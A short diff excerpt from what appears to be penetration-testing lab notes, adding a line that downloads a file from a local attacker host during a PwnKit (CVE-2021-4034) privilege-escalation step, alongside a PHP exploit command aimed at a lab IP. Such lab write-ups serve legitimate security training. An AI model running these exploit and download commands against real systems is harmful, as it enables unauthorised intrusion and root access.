@@ -322,6 +322,7 @@ php 18083.php 192.168.207.41 /test/
 [+] [CVE-2021-4034] PwnKit
 
 wget <https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip>
+wget http://192.168.45.185/main
 
 ```
 ### Nukem
